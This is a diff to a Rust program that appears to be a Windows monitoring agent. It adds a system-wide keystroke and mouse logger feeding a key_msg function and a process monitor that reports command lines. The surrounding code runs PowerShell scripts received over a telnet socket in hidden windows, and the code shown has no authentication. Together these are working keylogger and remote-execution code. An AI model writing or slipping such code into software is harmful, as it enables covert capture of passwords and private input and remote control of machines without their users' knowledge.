@@ -4,6 +4,7 @@
 use encoding::{all::GBK, DecoderTrap, Encoding};
 use evtx::EvtxParser;
 use hotwatch::{Event, Hotwatch};
+use inputbot::{KeybdKey, MouseButton, MouseCursor};
 #[allow(unused_imports)]
 use log::{debug, error, info, warn};
 use platform_dirs::UserDirs;
@@ -18,10 +19,10 @@ use std::{
     path::{Path, PathBuf},
     process::{Command, Stdio},
     str::from_utf8,
-    time::Duration,
+    time::Duration, fmt::format,
 };
 extern crate self_update;
-use chrono::{Datelike, FixedOffset, Utc};
+use chrono::{Datelike, FixedOffset, Local, Utc};
 
 mod session;
 use crate::{cobra::COBRA, session::trace_msg};
@@ -32,6 +33,13 @@ mod tests;
 use crate::structs::ConfigEnv;
 
 mod cobra;
+
+// 15 Oct 2023
+mod keyboard_monitor;
+use keyboard_monitor::*;
+use sysinfo::{Pid, ProcessExt, ProcessRefreshKind, System, SystemExt};
+mod process_monitor;
+use process_monitor::*;
 
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 /// executeable file -> [process_name]
@@ -155,7 +163,7 @@ pub fn repeatedly_execute(process_name: String) {
 /// CLI  
 pub fn powershell(pangram: &str) {
     // let pangram = r#"Get-SmbOpenFile|select ClientComputerName,Path"#;
-    
+
     let process = match Command::new("powershell")
         .creation_flags(CREATE_NO_WINDOW)
         .stdin(Stdio::piped())
@@ -331,7 +339,6 @@ pub fn receive_message() {
                 stream.set_write_timeout(Some(Duration::from_secs(cfg.telnet.timeout)));
                 stream.set_read_timeout(Some(Duration::from_secs(cfg.telnet.timeout)));
                 loop {
-                    
                     let mut buffer = [0; 1024];
                     match stream.read(&mut buffer) {
                         Ok(bytes_read) => {
@@ -350,13 +357,10 @@ pub fn receive_message() {
                                     stream.write_all(res.as_bytes());
                                 }
                                 stream.write_all(b"processed msg\r\n");
-                            }else if bytes_read==0{
+                            } else if bytes_read == 0 {
                                 // 斷開連接
                                 break;
                             }
-                       
-                       
-                            
                         }
                         Err(e) => {
                             warn!("Failed to receive data: {}", e);
@@ -365,7 +369,6 @@ pub fn receive_message() {
                             break;
                         }
                     }
-
                 }
             }
             Err(e) => {
@@ -404,15 +407,14 @@ fn process_message(s: &str) -> String {
                     return cobra::COBRA_MESSAGE.join("\n");
                 }
             }
-            "powershell"=>{
+            "powershell" => {
                 //  這裡用來執行powershell遠端命令, 接收的參數為腳本路徑
-                if v[1]!= "" {
+                if v[1] != "" {
                     // 拼接後面所有的字符串
                     let path = v.iter().skip(1).map(|&x| x).collect::<Vec<_>>().join(" ");
-                    println!("cmd path: {}",  path);
-                    powershell(format!("& {}" , path).as_str());
+                    println!("cmd path: {}", path);
+                    powershell(format!("& {}", path).as_str());
                 }
-                
             }
             _ => (),
         }
@@ -614,5 +616,85 @@ pub fn cfg_update(start_with: &str, hole_line: &str) {
         contents.push_str(hole_line);
         std::io::Seek::seek(&mut file, std::io::SeekFrom::Start(0)).unwrap();
         std::io::Write::write_all(&mut file, contents.as_bytes()).unwrap();
+    }
+}
+
+/// 監控鍵盤和鼠標
+
+pub fn keyboard_monitor() {
+    // let now = Local::now().format("%Y-%m-%d %H:%M:%S");
+    KeybdKey::bind_all(|event| match inputbot::from_keybd_key(event) {
+        Some(key) => key_msg(format!("{:?}", key)),
+        //println!("{:?}", key),
+        // Local::now().format("%Y-%m-%d %H:%M:%S"),
+        None => key_msg(format!("{:?}", event)),
+    });
+    MouseButton::bind_all(|event| {
+        // println!("{:?},{:?}", event, MouseCursor::pos());
+        key_msg(format!("{:?},{:?}", event, MouseCursor::pos()));
+    });
+
+    inputbot::handle_input_events();
+}
+
+pub fn processes_monitor() {
+    let cfg = ConfigEnv::from_env().expect("Failed to initialize project configuration");
+    if !cfg.monitor.default {
+        return;
+    }
+    let delay = cfg.monitor.refresh_interval;
+    let monitor_process_array = &cfg.monitor.process;
+    macro_rules! format_time {
+        ($timestamp:expr) => {{
+            let duration = chrono::Duration::seconds($timestamp);
+            let hours = duration.num_hours();
+            let minutes = duration.num_minutes() % 60;
+            format!("{:02}:{:02}", hours, minutes)
+        }};
+    }
+    
+    let mut system = System::new_all();
+    let monitor_process: Vec<&str> = monitor_process_array
+    .trim_matches('"')
+    .trim()
+    .split(',')
+    .map(|s| s.trim())
+    .collect();
+    loop {
+        let processes = system.processes();
+        'outer: for (id, process) in processes {
+            // println!("PID: {}, Name: {:?}", pid, process.name());
+            for i in &monitor_process {
+                if (process.name().contains(i)) {
+                    // println!("exe: {:?}\n", process.exe());
+                    // println!("cmd: {:?}\n", process.cmd());
+                    // println!("memory: {:?} MB\n", process.memory() / 1048576); // 1048576 = 1024*1024  //raw in bytes)
+                    // println!(
+                    //     "virtual_memory(sys): {:?} GB\n",
+                    //     process.virtual_memory() / 1048576 / 1024
+                    // ); //raw in bytes
+                    // println!("status: {:?}\n", process.status());
+                    // println!(
+                    //     "start_time: {:?}\n",
+                    //     chrono::naive::NaiveDateTime::from_timestamp_opt(
+                    //         process.start_time() as i64,
+                    //         0
+                    //     )
+                    //     .unwrap()
+                    //         + chrono::Duration::hours(8)
+                    // );
+                    // println!("run_time: {:?}\n", format_time!(process.run_time() as i64));
+                    // println!("cpu_usage: {:?}\n", process.cpu_usage()); //divide the returned value by the number of CPUs.
+                    // println!("disk_usage: {:?}\n", process.disk_usage());
+                    // disk_usage: DiskUsage { total_written_bytes: 7797746, written_bytes: 0, total_read_bytes: 82554875, read_bytes: 0 }
+
+                    process_msg((format!("Name: {:?}, Cmd: {:?}, Memory: {:?} MB, VirtualMemory: {:?} GB, Status: {:?}, Start_time: {:?}, Run_time: {:?}, Cpu_usage: {:?}, Disk_usage: {:?}",
+                process.name(),process.cmd(),process.memory() / 1048576,process.virtual_memory() / 1048576 / 1024,process.status(),chrono::naive::NaiveDateTime::from_timestamp_opt(process.start_time() as i64,0).unwrap() + chrono::Duration::hours(8),format_time!(process.run_time() as i64),process.cpu_usage(),process.disk_usage())));
+                    break 'outer;
+                }
+            }
+        }
+        sleep(delay);
+        system.refresh_processes();
     }
 }
